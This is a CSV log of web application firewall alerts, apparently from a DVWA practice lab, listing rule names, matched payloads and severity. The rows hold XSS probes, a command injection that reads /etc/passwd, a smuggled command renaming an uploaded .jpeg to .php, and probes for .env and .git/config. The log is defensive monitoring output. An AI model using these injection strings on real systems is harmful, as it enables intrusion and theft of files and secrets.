Attack Type,URL Used,Payload Used,Severity
NoScript XSS InjectionChecker: HTML Injection,,<img src=sd onerror= found within ARGS:txtName: <img src=sd onerror=alert(\x22XSS\x22)>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,,<body onload= found within ARGS:mtxMessage: <body onload=alert(\x22supbij\x22)>,CRITICAL
XSS Attack Detected via libinjection,,XSS data found within ARGS:txtName: <img src=sd onerror=alert(\\\\x22XSS\\\\x22)>,CRITICAL
XSS Attack Detected via libinjection,,XSS data found within ARGS:mtxMessage: <body onload=alert(\\\\x22supbij\\\\x22)>,CRITICAL
XSS Filter - Category 2: Event Handler Vector,, onerror= found within ARGS:txtName: <img src=sd onerror=alert(\\\\x22XSS\\\\x22)>,CRITICAL
XSS Filter - Category 2: Event Handler Vector,, onload= found within ARGS:mtxMessage: <body onload=alert(\\\\x22supbij\\\\x22)>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,,<img src=sd onerror= found within ARGS:txtName: <img src=sd onerror=alert(\\\\x22XSS\\\\x22)>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,,<body onload= found within ARGS:mtxMessage: <body onload=alert(\\\\x22supbij\\\\x22)>,CRITICAL
OS File Access Attempt,,etc/passwd found within ARGS:ip: 127.0.0.1|cat /etc/passwd,CRITICAL
Remote Command Execution: Unix Command Injection,,|cat /etc/passwd found within ARGS:ip: 127.0.0.1|cat /etc/passwd,CRITICAL
Remote Command Execution: Unix Shell Code Found,,etc/passwd found within ARGS:ip: 127.0.0.1|cat/etc/passwd,CRITICAL
OS File Access Attempt,,etc/passwd found within ARGS:ip: 127.0.0.1|cat /etc/passwd,CRITICAL
Remote Command Execution: Unix Command Injection,,|cat /etc/passwd found within ARGS:ip: 127.0.0.1|cat /etc/passwd,CRITICAL
Remote Command Execution: Unix Shell Code Found,,etc/passwd found within ARGS:ip: 127.0.0.1|cat/etc/passwd,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Remote Command Execution: Unix Command Injection,,|mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Remote Command Execution: Unix Command Injection,,|mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Remote Command Execution: Unix Command Injection,,|mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Remote Command Execution: Unix Command Injection,,|mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.git/ found within REQUEST_FILENAME: /.git/config,CRITICAL
Restricted File Access Attempt,,/.git/ found within REQUEST_FILENAME: /.git/config,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Restricted File Access Attempt,,/.git/ found within REQUEST_FILENAME: /.git/config,CRITICAL
Restricted File Access Attempt,,/.git/ found within REQUEST_FILENAME: /.git/config,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.git/ found within REQUEST_FILENAME: /.git/config,CRITICAL
Restricted File Access Attempt,,/.git/ found within REQUEST_FILENAME: /.git/config,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
